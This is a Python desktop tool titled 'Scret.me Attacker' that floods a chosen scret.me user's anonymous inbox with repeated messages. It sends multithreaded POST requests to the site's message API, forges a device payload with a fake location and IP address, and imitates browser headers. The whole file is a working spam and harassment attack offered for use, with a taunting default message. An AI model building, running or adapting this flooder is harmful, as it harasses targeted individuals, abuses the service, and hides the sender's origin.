import json
import requests
import threading
import time
import customtkinter as ctk
from datetime import datetime
import os
from win10toast import ToastNotifier


class AttackerApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Scret.me Attacker by lalaio1")
        self.geometry("1000x600")
   
        self.config_frame = ctk.CTkFrame(self)
        self.config_frame.pack(side='left', fill='y', padx=15, pady=10)



        self.target_url_label = ctk.CTkLabel(self.config_frame, text="Target URL")
        self.target_url_label.pack(pady=10)
        self.target_url_entry = ctk.CTkEntry(self.config_frame)
        self.target_url_entry.pack(pady=10)

        self.message_label = ctk.CTkLabel(self.config_frame, text="Message")
        self.message_label.pack(pady=10)
        self.message_entry = ctk.CTkEntry(self.config_frame, placeholder_text="get rekt loser")
        self.message_entry.pack(pady=10)

        self.timeout_label = ctk.CTkLabel(self.config_frame, text="Timeout (in ms)")
        self.timeout_label.pack(pady=10)
        self.timeout_entry = ctk.CTkEntry(self.config_frame, placeholder_text="1000")
        self.timeout_entry.pack(pady=10)

        self.threads_label = ctk.CTkLabel(self.config_frame, text="Threads")
        self.threads_label.pack(pady=10)
        self.threads_entry = ctk.CTkEntry(self.config_frame, placeholder_text="1")
        self.threads_entry.pack(pady=10)

        self.attack_button = ctk.CTkButton(self.config_frame, text="Attack", command=self.toggle_attack)
        self.attack_button.pack(pady=20)

        self.stats_frame = ctk.CTkFrame(self)
        self.stats_frame.pack(side='top', fill='x', padx=10, pady=10)

        self.messages_sent_label = ctk.CTkLabel(self.stats_frame, text="Messages Sent: 0", anchor="w")
        self.messages_sent_label.grid(row=0, column=0, padx=10, pady=5, sticky="w")

        self.messages_per_minute_label = ctk.CTkLabel(self.stats_frame, text="Messages per Minute: 0", anchor="w")
        self.messages_per_minute_label.grid(row=1, column=0, padx=10, pady=5, sticky="w")

        self.elapsed_time_label = ctk.CTkLabel(self.stats_frame, text="Elapsed Time: 0", anchor="w")
        self.elapsed_time_label.grid(row=2, column=0, padx=10, pady=5, sticky="w")

        self.log_frame = ctk.CTkFrame(self)
        self.log_frame.pack(side='bottom', fill='both', expand=True, padx=10, pady=10)

        self.log_text = ctk.CTkTextbox(self.log_frame, height=10, state='disabled')
        self.log_text.pack(pady=10, padx=10, fill='both', expand=True)

        self.attacking = False
        self.attack_thread = None
        self.ui_thread = None  # Thread para lidar com a interface gráfica
        self.messages_sent = 0
        self.start_time = None
        self.stop_event = threading.Event() 
        self.threads_list = []

        self.log_text.tag_config('error', foreground='red')

    

        self.protocol("WM_DELETE_WINDOW", self.on_closing)

        self.show_notification_async("Scret.me", "Bem Vindo, © 2024 Lalaio1", duration=10, icon_path=f"./conf/scripts/assets/icons.ico")

        self.ui_thread = threading.Thread(target=self.mainloop)
        self.ui_thread.start()

    def show_notification(self, title, message, duration=10, icon_path=None):
        toaster = ToastNotifier()

        if icon_path and os.path.isfile(icon_path):
            toaster.show_toast(title, message, duration=duration, icon_path=icon_path)
        else:
            toaster.show_toast(title, message, duration=duration)

    def show_notification_async(self, title, message, duration=10, icon_path=None):
        notification_thread = threading.Thread(target=self.show_notification, args=(title, message, duration, icon_path))
        notification_thread.start()



    def log(self, message):
        self.log_text.configure(state='normal')
        self.log_text.insert('end', message + '\n')
        self.log_text.yview('end')
        self.log_text.configure(state='disabled')

    def toggle_attack(self):
        if self.attacking:
            self.attacking = False
            self.attack_button.configure(text="Attack")
            self.log("Attack stopped.")
            self.stop_event.set()  # Sinaliza para parar todas as threads
            self.attack_thread.join()  # Espera o thread principal de ataque parar
            self.stop_event.clear()  # Reseta o evento para a próxima execução
        else:
            self.attacking = True
            self.attack_button.configure(text="Stop")
            self.messages_sent = 0
            self.start_time = datetime.now()
            target_url = self.target_url_entry.get()
            message = self.message_entry.get()
            timeout = int(self.timeout_entry.get())
            threads = int(self.threads_entry.get())  
            self.attack_thread = threading.Thread(target=self.attack, args=(target_url, message, timeout, threads))
            self.attack_thread.start()

    def attack(self, url, message, delay, threads):
        user = url.split("https://scret.me/")[1]
        self.log(f'[!] Tentando enviar ataque ao usuário {user} ...')
        payload = {
            'slug': user,
            'content': f"{message}   [© 2024 Lalaio1]",
            'device': json.dumps({
                'country_code': 'US',
                'country_name': 'United States',
                'city': 'Washington, D.C.',
                'postal': '20001',
                'latitude': 38.895111,
                'longitude': -77.036369,
                'IPv4': '173.166.164.121',
                'state': 'District Of Columbia',
                'userAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
            }),
            'tips': []
        }

        self.threads_list = []
        for _ in range(threads):
            thread = threading.Thread(target=self.send_messages, args=(payload, delay))
            thread.start()
            self.threads_list.append(thread)

        for thread in self.threads_list:
            thread.join()

    def send_messages(self, payload, delay):
        while self.attacking and not self.stop_event.is_set():
            start = datetime.now()
            try:
                response = requests.post('https://api.scret.me/v1/message', json=payload, headers={
                    'Content-Type': 'application/json',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.9,pt;q=0.8',
                    'Referer': 'https://scret.me/',
                    'Referrer-Policy': 'strict-origin-when-cross-origin',
                    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site'
                })

                data = response.json()
                if data.get('isValid'):
                    self.messages_sent += 1
                    self.log(f'[+] Ataque enviado com sucesso ao usuário {payload["slug"]}')
            except Exception as e:
                self.log(f'[-] Error: {e}', 'error')

            elapsed = (datetime.now() - start).total_seconds() * 1000
            time.sleep(max(0, (delay - elapsed) / 1000))

            self.update_stats()

    def update_stats(self):
        elapsed_time = datetime.now() - self.start_time
        minutes_elapsed = elapsed_time.total_seconds() / 60
        messages_per_minute = self.messages_sent / minutes_elapsed if minutes_elapsed > 0 else 0

        self.messages_sent_label.configure(text=f"Messages Sent: {self.messages_sent}")
        self.messages_per_minute_label.configure(text=f"Messages per Minute: {messages_per_minute:.2f}")
        self.elapsed_time_label.configure(text=f"Elapsed Time: {elapsed_time}")

    def on_closing(self):
        if self.attacking:
            self.attacking = False
            self.stop_event.set()
            self.attack_thread.join()  

        self.destroy() 
        self.ui_thread.join() 
        
if __name__ == '__main__':
    app = AttackerApp()
    app.mainloop()
